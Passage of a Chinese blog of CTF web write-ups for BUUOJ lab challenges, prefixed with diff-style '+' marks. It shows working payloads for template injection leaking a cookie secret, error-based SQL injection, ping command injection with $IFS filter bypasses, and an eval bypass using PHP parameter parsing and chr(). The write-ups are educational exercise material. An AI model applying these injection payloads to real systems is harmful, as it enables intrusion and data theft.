+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(stristr($file,<span class="string">&quot;php://input&quot;</span>) || stristr($file,<span class="string">&quot;zip://&quot;</span>) || stristr($file,<span class="string">&quot;phar://&quot;</span>) || stristr($file,<span class="string">&quot;data:&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($file)&#123;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h3><p>存在模板注入，在error?msg=处。</p>
+<blockquote>
+<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>
+<p>引自笑花大王:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12285121.html">https://www.cnblogs.com/xhds/p/12285121.html</a></p>
+</blockquote>
+<p>Payload：<code>http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></p>
+<p>可获得环境变量，其中包括了cookie_secret</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;autoreload&#x27;</span>: True, <span class="string">&#x27;compiled_template_cache&#x27;</span>: False, <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据hints.txt的提示，./fllllllllllllag应该传入的filehash=md5(cookie_secret+md5(filename))，计算过程如下，此计算过程我直接使用了浏览器插件Hasher，它真的很棒。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(/fllllllllllllag) = 3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">cookie_secret = e9d83199-02cc-4dc0-9c5e-db259e149331</span><br><span class="line">md5(e9d83199-02cc-4dc0-9c5e-db259e1493313bf9f6cf685a6dd8defadabfb41a03a1)=f8f08978b32c8b0786ff90a4b4379ea1</span><br></pre></td></tr></table></figure>
+<p>另外，直接用python3的hashlib库也可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashlib.md5(bytes(<span class="string">&#x27;e9d83199-02cc-4dc0-9c5e-db259e149331&#x27;</span> + hashlib.md5(<span class="string">b&#x27;/fllllllllllllag&#x27;</span>).hexdigest(), encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br></pre></td></tr></table></figure>
+
+<p>Payload:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://9cd5726b-c9b8-43db-84ed-1c786f46bbc1.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=f8f08978b32c8b0786ff90a4b4379ea1</span><br><span class="line"></span><br><span class="line">flag&#123;d8bd1174-f15f-49cf-8c10-8a861e4f7b0b&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="七、"><a href="#七、" class="headerlink" title="七、"></a>七、</h3><p>​    和第五题一样，可以or万能密码注入。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=1&amp;password=1234<span class="string">&#x27; or 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">Your password is <span class="string">&#x27;70b75a27bc538ac305baffd8aaa79259&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>​    此时发现登陆成功后不直接给flag了，尝试报错注入吧。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">数据库：http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^sh<span class="string">&#x27;,(select database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geek^&#x27;</span></span><br><span class="line">------------------------------</span><br><span class="line">数据表：http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^geekuser,l0ve1ysq1^&#x27;</span></span><br><span class="line">-------------------------------</span><br><span class="line">爆l0ve1ysq1的字段：http://49e8ad85-99a8-4813-bf93-sh1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(column_name),1,20) from information_schema.columns where  table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: <span class="string">&#x27;^id,username,password^&#x27;</span></span><br><span class="line">--------------------------------</span><br><span class="line">Flag就在10ve1ysq1表中的password字段中，在248以后：</span><br><span class="line">http://49e8ad85-99a8-4813-bf93-1df9aab0fbab.node3.buuoj.cn/check.php?username=admin&amp;password=1234<span class="string">&#x27; or updatexml(1,concat(&#x27;</span>^<span class="string">&#x27;,(select substr(group_concat(password),248,31) from l0ve1ysq1),&#x27;</span>^<span class="string">&#x27;),1) and 1=&#x27;</span>1</span><br><span class="line"></span><br><span class="line">flag&#123;690ae2e0-9ddf-41e9-a7f6-bc878dd458e3&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/B8SxJJ"><img src="https://s1.ax1x.com/2020/10/28/B8SxJJ.png" alt="B8SxJJ.png"></a></p>
+<h3 id="八、"><a href="#八、" class="headerlink" title="八、"></a>八、</h3><p>ping命令注入，过滤了空格、重定向符、单双引号、cat。并且只要字符串中顺序出现flag，不管其中分隔多少字符，都被检测到。例如:<code>f123l123a123g123</code>，这种的话还是可以被检测到，不知道用了啥接口儿，等下哥哥看看源码儿。</p>
+<p>解决方法是这里使用变量拼接，且flag拼接的顺序颠倒，$IFS代替空格的方式绕过。</p>
+<p>Payload：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://bd478ba2-5157-4cab-8148-49f83abe0e37.node3.buuoj.cn/?ip=;b=g.php;a=fla;tac<span class="variable">$IFS</span><span class="variable">$a</span><span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;71c116c7-dc50-402d-b24e-e91afaedae83&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>看看源码儿啥样</p>
+<p>Payload：<code>?ip=;b=x.php;a=inde;cat$IFS$a$b|base64;</code>完了解码儿一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;ip&#x27;</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your symbol!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ /&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your space!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/bash/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your bash!&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.*f.*l.*a.*g.*/&quot;</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck your flag!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">&quot;ping -c 4 &quot;</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="九、-RoarCTF-2019-Easy-Calc1"><a href="#九、-RoarCTF-2019-Easy-Calc1" class="headerlink" title="九、[RoarCTF 2019]Easy Calc1"></a>九、[RoarCTF 2019]Easy Calc1</h3><blockquote>
+<p>总结：空格+变量名绕过WAF检测，chr()拼接绕过正则过滤。</p>
+</blockquote>
+<p>查看源码儿，输入的表达式被URL编码后作为参数传递到calc.php中，查看一下calc.php源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PHP的字符串解析特性是什么？</p>
+<p>答： PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】</p>
+<p>节选自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/chrysanthemum/p/11757363.html">https://www.cnblogs.com/chrysanthemum/p/11757363.html</a></p>
+</blockquote>
+<p>​    这里自己菜了，eval本身就是执行php代码，echo phpinfo();本身就是echo出phpinfo()的代码结果，所以自己甚至复现环境去试验了半天。另外源码中只显示了部分过滤的字符，其中原题中还有WAF。</p>
+<p>​    这里的主要绕过方式是PHP字符串解析特性漏洞，num变量前加一个空格，让<strong>waf认为是’ num’变量而绕过过滤</strong>，但<strong>PHP会自动去除空格得到num变量从而绕过WAF</strong>。构造<code> num=phpinfo();</code>成功执行phpinfo，查看一下disable_functions，禁用了非常多的函数。</p>
+<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/BYC8Xj"><img src="https://s1.ax1x.com/2020/10/29/BYC8Xj.png" alt="BYC8Xj.png"></a></p>
+<p>​    这里使用<code>scandir()</code>函数读取某目录中的所有文件，返回数组对象。</p>
+<p>​    Payload：（<strong>重点：</strong>scandir返回值是一个<strong>数组对象</strong>，因此需要用var_dump才能显示内容），另外’/‘在源码中被过滤，可以使用chr()来绕过。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://node3.buuoj.cn:27536/calc.php?num=var_dump(scandir(chr(47)));</span><br><span class="line"></span><br><span class="line">array(24) &#123; [0]=&gt; string(1) <span class="string">&quot;.&quot;</span> [1]=&gt; string(2) <span class="string">&quot;..&quot;</span> [2]=&gt; string(10) <span class="string">&quot;.dockerenv&quot;</span> [3]=&gt; string(3) <span class="string">&quot;bin&quot;</span> [4]=&gt; string(4) <span class="string">&quot;boot&quot;</span> [5]=&gt; string(3) <span class="string">&quot;dev&quot;</span> [6]=&gt; string(3) <span class="string">&quot;etc&quot;</span> [7]=&gt; string(5) <span class="string">&quot;f1agg&quot;</span> [8]=&gt; string(4) <span class="string">&quot;home&quot;</span> [9]=&gt; string(3) <span class="string">&quot;lib&quot;</span> [10]=&gt; string(5) <span class="string">&quot;lib64&quot;</span> [11]=&gt; string(5) <span class="string">&quot;media&quot;</span> [12]=&gt; string(3) <span class="string">&quot;mnt&quot;</span> [13]=&gt; string(3) <span class="string">&quot;opt&quot;</span> [14]=&gt; string(4) <span class="string">&quot;proc&quot;</span> [15]=&gt; string(4) <span class="string">&quot;root&quot;</span> [16]=&gt; string(3) <span class="string">&quot;run&quot;</span> [17]=&gt; string(4) <span class="string">&quot;sbin&quot;</span> [18]=&gt; string(3) <span class="string">&quot;srv&quot;</span> [19]=&gt; string(8) <span class="string">&quot;start.sh&quot;</span> [20]=&gt; string(3) <span class="string">&quot;sys&quot;</span> [21]=&gt; string(3) <span class="string">&quot;tmp&quot;</span> [22]=&gt; string(3) <span class="string">&quot;usr&quot;</span> [23]=&gt; string(3) <span class="string">&quot;var&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    chr绕过过滤（<strong>错误点：</strong>chr()本身就是字符类型，使用<code>.</code>拼接即是一段字符串，无须拼接<code>&quot;或&#39;</code>）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//node3.buuoj.cn:27536/calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span></span><br><span class="line"></span><br><span class="line">Flag：flag&#123;bf14d19d-dfef<span class="number">-473</span>c-ba1a-f0a90500f7cc&#125;</span><br></pre></td></tr></table></figure>
+
+
+                
+<p class="pink-link-context">
+    <a href="/2020/09/14/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/19%E3%80%81JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="next" title="">
+    上一篇：
+  </a>
+</p>
+
+
+
+<p class="pink-link-context">
+    <a href="/2020/09/12/CTF%E7%AC%94%E8%AE%B0/XSS%20challenge/" rel="next" title="XSS challenge">
+    下一篇：XSS challenge
+  </a>
+</p>
+
+
+            </div>
+			
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+</div>
+
+        <div class="fixed-action-btn float-sitemap">
+    <a class="btn-floating btn-large pink">
+      <i class="fa fa-caret-square-o-up"></i>
+    </a>
+    <ul>
+      <li><a class="btn-return-top btn-floating waves-effect green" title="回到顶部"><i class="fa fa-arrow-circle-o-up"></i></a></li>
+      <li><a class="btn-floating waves-effect button-collapse yellow darken-1"  data-activates="main-menu" title="菜单"><i class="fa fa-navicon"></i></a></li>
+    </ul>
+  </div>
+
+    </main>
+    <footer class="page-footer indigo darken-1">
+    
+    <div class="footer-container container">
+        <div class="row">
+            
+            <div class="social-group col m4 s12">
+                <h5 class="white-text">社交</h5>
+                
+                    <a class="social-link" href="http://weibo.com/1956184117" target="_blank">
+                        <i class="fa fa-2x fa-weibo"></i>
+                    </a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">
+                        <i class="fa fa-2x fa-github"></i>
+                    </a>
+                
+                    <a class="social-link" href="/atom.xml" target="_blank">
+                        <i class="fa fa-2x fa-rss"></i>
+                    </a>
+                
+                
+
+            </div>
+            
+
+            
+            <div class="col m8 s12">
+                <h5 class="white-text">友情链接</h5>
+                
+                    <a class="social-link" href="http://raytaylorlin.com/" target="_blank">raytaylorism主题作者的技术博客</a>
+                
+                    <a class="social-link" href="https://github.com/raytaylorlin" target="_blank">Github地址（测试友情链接）</a>
+                
+            </div>
+            
+        </div>
+    </div>
+    
+
+    <div class="footer-copyright pink-link-context">
+        <div class="container">
+            © 2016 example.com, All rights reserved.
+            <p class="right" style="margin-top: 0;">本博客由 <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> 强力驱动 | 主题 <a target="_blank" rel="noopener" href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
+        </div>
+    </div>
+</footer>
+
+
+    <noscript>
+    <div class="noscript">
+        <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+    </div>
+</noscript>
+<div class="noscript">
+    <p class="center-align">当前网速较慢或者你使用的浏览器不支持博客特定功能，请尝试刷新或换用Chrome、Firefox等现代浏览器</p>
+</div>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/materialize.min.js"></script>
+
+<script>
+    (function($) {
+        $(document).ready(function() {
+            // 隐藏禁用javascript（针对微信内置浏览器）的提示
+            $('.noscript').hide();
+
+            // 图片缩放效果
+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass('pink lighten-2');
+
+            
+            // 添加new标签
+            $('').append('<span class="new badge pink"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+
+</body>
+</html>
